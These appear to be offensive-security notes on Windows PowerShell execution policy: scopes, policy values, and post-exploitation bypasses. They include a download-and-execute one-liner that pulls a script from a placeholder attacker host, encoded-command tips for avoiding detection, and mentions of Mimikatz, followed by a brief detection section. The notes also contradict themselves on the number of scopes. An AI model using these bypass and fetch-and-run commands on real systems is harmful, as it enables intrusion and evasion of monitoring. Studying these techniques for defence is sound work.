# Windows PowerShell Execution Policy

The **Execution Policy** in PowerShell is a safety feature designed to control the conditions under which PowerShell loads configuration files and runs scripts. It is **not a security boundary**, but understanding and manipulating it is essential in post-exploitation to execute malicious scripts or bypass detection.
## 1. Execution Policy Levels

PowerShell has **4 scopes** for execution policy:

|Scope|Description|
|---|---|
|`MachinePolicy`|Set by Group Policy for all users (highest priority)|
|`UserPolicy`|Set by Group Policy for the current user|
|`Process`|Affects only the current PowerShell session|
|`CurrentUser`|Affects only the current user|
|`LocalMachine`|Applies to all users on the computer (default)|
## 2. Common Policy Values

| Policy         | Description                                                    |
| -------------- | -------------------------------------------------------------- |
| `Restricted`   | Default for Windows client OS; no scripts allowed              |
| `AllSigned`    | Only scripts signed by a trusted publisher can be run          |
| `RemoteSigned` | Local scripts run fine; downloaded scripts must be signed      |
| `Unrestricted` | All scripts can run; warns before executing downloaded scripts |
| `Bypass`       | Nothing is blocked and no warnings are shown                   |
## 3. Check Execution Policy

```powershell
Get-ExecutionPolicy -List
```
## 4. Modify Execution Policy

### Temporary (Current Session)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

This is preferred in post-exploitation to avoid persistent changes.
### Persistent (All Users)

```powershell
Set-ExecutionPolicy RemoteSigned -Scope LocalMachine
```

> Requires administrative privileges.
## 5. Bypass Techniques (Post-Exploitation)

Even if the execution policy blocks script execution, there are several ways to **bypass** it:
### ▶ Using `-ExecutionPolicy` Flag

```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```
### ▶ Encoded Commands

```powershell
powershell -EncodedCommand <Base64Command>
```
### ▶ Inline Commands

```powershell
powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```
## 6. Offensive Use Cases

| Situation                       | Technique                                            |
| ------------------------------- | ---------------------------------------------------- |
| **Script blocked**              | `Set-ExecutionPolicy Bypass -Scope Process`          |
| **Avoid detection/logging**     | Use encoded or inline payloads                       |
| **Script download and exec**    | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| **Running PowerView, Mimikatz** | Often needs execution policy changes or bypasses     |
## 7. Detection and Logging

Sysmon or PowerShell logs (Event ID 4104) may capture script block logging.  
Security solutions may trigger alerts on:

- Use of `Set-ExecutionPolicy`    
- Use of `-EncodedCommand` or `IEX`
